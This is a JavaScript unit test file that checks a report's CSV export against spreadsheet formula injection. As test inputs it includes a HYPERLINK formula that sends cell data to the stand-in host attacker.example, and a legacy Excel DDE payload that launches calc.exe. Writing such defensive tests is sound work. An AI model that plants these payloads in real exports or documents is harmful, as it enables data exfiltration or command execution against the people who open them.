// Run with: node --test echonet/static/report_csv_escape.test.js
//
// Demonstrates and guards against CSV/formula injection in the echonet report's
// per-section CSV export (report.js `csvEscape`). Report fields such as revert
// reasons, gateway error bodies, and OS-run output can carry attacker-influenced
// text; if such a field starts with =, +, -, or @, a spreadsheet application
// (Excel/Sheets/LibreOffice) evaluates it as a formula when the exported CSV is
// opened, enabling data exfiltration or, under legacy DDE-enabled Excel
// configurations, command execution.
const test = require("node:test");
const assert = require("node:assert/strict");

// report.js is a browser script with no module system: it runs its full IIFE
// body on load, ending in `document.readyState === "loading" ? ... : boot()`.
// Stub just enough of `document` so that check takes the "still loading"
// branch and returns without calling boot() (which walks a real DOM).
global.document = { readyState: "loading", addEventListener: () => {} };
const { csvEscape } = require("./report.js");

// Reverses the CSV-grammar quoting `csvEscape` applies (unrelated to the
// formula-injection guard under test) so assertions can check the guarded
// content directly instead of hand-computing an escaped literal.
function unquoteCsvField(field) {
    if (field.startsWith('"') && field.endsWith('"')) {
        return field.slice(1, -1).replace(/""/g, '"');
    }
    return field;
}

test("neutralizes formula-injection payloads that start a cell", () => {
    // Simulates a malicious revert reason exfiltrating other cells to an
    // attacker-controlled URL when the exported CSV is opened in a spreadsheet.
    const exfiltrationPayload = '=HYPERLINK("http://attacker.example/leak?d="&A1&A2,"click")';
    assert.equal(unquoteCsvField(csvEscape(exfiltrationPayload)), `'${exfiltrationPayload}`);

    // Legacy Excel DDE command-execution payload.
    assert.equal(csvEscape("=cmd|'/c calc.exe'!A1"), "'=cmd|'/c calc.exe'!A1");

    // The other three spreadsheet formula triggers.
    assert.equal(csvEscape("+1+1"), "'+1+1");
    assert.equal(csvEscape("-1+1"), "'-1+1");
    assert.equal(csvEscape("@SUM(A1:A2)"), "'@SUM(A1:A2)");

    // A leading tab or carriage return is also treated as a formula trigger by
    // some spreadsheet applications.
    assert.equal(csvEscape("\t=1+1"), "'\t=1+1");
});

test("only guards a cell whose content starts with a trigger character", () => {
    // A trigger character elsewhere in the field is not a spreadsheet formula
    // and must be left untouched.
    assert.equal(csvEscape("reverted: a=b+c"), "reverted: a=b+c");
    assert.equal(csvEscape("0x1234"), "0x1234");
});

test("still quotes fields containing commas, quotes, or newlines", () => {
    assert.equal(csvEscape("a,b"), '"a,b"');
    assert.equal(csvEscape('say "hi"'), '"say ""hi"""');
    assert.equal(csvEscape("line1\nline2"), '"line1\nline2"');

    // The formula guard is applied before quoting, so a guarded value that also
    // needs quoting ends up correctly quoted with the guard preserved inside.
    assert.equal(csvEscape("=A1,B1"), '"\'=A1,B1"');
});

test("passes through null, undefined, and plain values unchanged", () => {
    assert.equal(csvEscape(null), "");
    assert.equal(csvEscape(undefined), "");
    assert.equal(csvEscape(42), "42");
    assert.equal(csvEscape("ok"), "ok");
});
